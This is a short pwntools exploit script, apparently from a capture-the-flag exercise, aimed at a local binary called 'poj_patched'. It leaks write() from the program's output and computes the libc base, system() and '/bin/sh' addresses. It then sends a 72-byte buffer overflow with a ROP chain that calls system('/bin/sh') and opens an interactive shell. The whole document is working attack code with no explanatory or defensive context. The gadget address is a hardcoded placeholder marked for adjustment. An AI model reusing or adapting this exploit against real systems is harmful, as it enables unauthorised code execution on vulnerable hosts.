from pwn import *

# Setup
elf = ELF('./poj_patched')
libc = ELF('./libc.so.6')
p = process('./poj_patched')

# Step 1: Leak the write() address from the binary
p.recvuntil("Write() address : ")
write_leak = int(p.recvline().strip(), 16)

log.info(f"Leaked write() address: {hex(write_leak)}")

# Step 2: Calculate libc base and system() / binsh addresses
libc_base = write_leak - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system() address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(binsh_addr)}")

# Step 3: ROP chain setup
pop_rdi = 0x0000000000001156  # Adjust based on ROPgadget findings

payload = b'A' * 72  # Buffer overflow
payload += p64(pop_rdi)  # ROP gadget to control rdi
payload += p64(binsh_addr)  # Argument to system() ("/bin/sh")
payload += p64(system_addr)  # Call system()

# Step 4: Send payload and interact
p.sendline(payload)
p.interactive()
